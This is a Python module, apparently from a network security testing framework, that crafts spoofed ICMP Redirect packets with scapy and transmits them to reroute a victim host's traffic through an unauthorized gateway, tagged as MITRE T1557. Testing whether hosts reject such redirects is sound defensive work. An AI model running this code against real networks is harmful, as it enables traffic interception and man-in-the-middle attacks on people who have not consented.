"""ICMP Redirect Route Manipulation Test Module.

Generates crafted ICMP Type 5 (Redirect) packets to test whether host
operating systems and network switches reject unauthorized route
manipulation and comply with RFC 1122 / RFC 1812 security baselines.
"""

import time
from datetime import datetime

from scapy.all import Ether, ICMP, IP, sendp

from attacks.base import BaseAttack
from common.models import AttackResult


class ICMPRedirect(BaseAttack):
    """Simulates unauthorized ICMP route redirect messages."""

    attack_type = "icmp_redirect"

    def __init__(
        self,
        victim_ip: str,
        original_gateway_ip: str,
        redirect_to_gateway_ip: str,
        destination_ip: str = "8.8.8.8",
        interface: str = "eth0",
        dry_run: bool = False,
    ):
        """Initialize ICMP redirect simulation.

        Args:
            victim_ip: IP of the host whose routing table is targeted.
            original_gateway_ip: IP of the legitimate gateway (or attacker spoofing it).
            redirect_to_gateway_ip: Unauthorized router IP to divert traffic toward.
            destination_ip: Target destination whose route is being updated.
            interface: Network interface.
            dry_run: If True, crafts frames without raw socket transmission.
        """
        self.victim_ip = victim_ip
        self.original_gateway_ip = original_gateway_ip
        self.redirect_to_gateway_ip = redirect_to_gateway_ip
        self.destination_ip = destination_ip
        self.interface = interface
        self.dry_run = dry_run

    def build_redirect_packet(self, spoof_source_ip: str = None) -> Ether:
        """Construct an ICMP Type 5 Code 1 (Redirect Host) frame.

        An ICMP redirect encapsulates the offending IP header + 8 bytes
        of original payload that ostensibly triggered the redirect.
        """
        src_ip = spoof_source_ip or self.original_gateway_ip

        frame = (
            Ether(dst="ff:ff:ff:ff:ff:ff")
            / IP(src=src_ip, dst=self.victim_ip)
            / ICMP(type=5, code=1, gw=self.redirect_to_gateway_ip)
            / IP(src=self.victim_ip, dst=self.destination_ip)
        )
        return frame

    def launch(self, count: int = 5, interval: float = 0.1) -> AttackResult:
        """Execute the ICMP redirect test.

        Args:
            count: Number of redirect frames to transmit.
            interval: Seconds between transmissions.

        Returns:
            AttackResult with transmission metadata.
        """
        start_time = datetime.now()
        sent = 0

        for _ in range(count):
            pkt = self.build_redirect_packet()
            if not self.dry_run:
                try:
                    sendp(pkt, iface=self.interface, verbose=False)
                    sent += 1
                except Exception:
                    pass
            else:
                sent += 1
            if interval > 0:
                time.sleep(interval)

        duration = (datetime.now() - start_time).total_seconds()
        return AttackResult(
            attack_type=self.attack_type,
            packets_sent=sent,
            duration_s=duration,
            start_time=start_time,
            mitre_attack_id="T1557",
        )
